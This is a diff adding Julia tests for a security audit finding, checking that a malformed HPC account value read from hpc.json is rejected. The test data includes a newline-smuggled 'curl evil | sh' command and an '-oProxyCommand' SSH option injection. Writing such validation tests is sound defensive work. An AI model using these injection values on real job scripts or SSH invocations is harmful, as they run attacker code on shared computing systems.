@@ -209,6 +209,13 @@ end
     @test_throws ArgumentError set_hpc_project_account!(root, "a b")
     @test set_hpc_project_account!(root, "")["account"] == ""
     @test !isfile(joinpath(root, "settings", "hpc.json"))
+    # Security audit F5: hpc.json travels in a bundle, so a malformed account is dropped on READ —
+    # `strip` kept the inner newline, which became a line of the job script
+    mkpath(joinpath(root, "settings"))
+    for evil in ("grant\ncurl evil | sh", "-oProxyCommand=x", "a b")
+        write(joinpath(root, "settings", "hpc.json"), JSON3.write(Dict("account" => evil)))
+        @test (@test_logs (:warn,) match_mode=:any read_hpc_project_settings(root))["account"] == ""
+    end
 end
 
 @testset "HPC: ssh arguments + probe script" begin
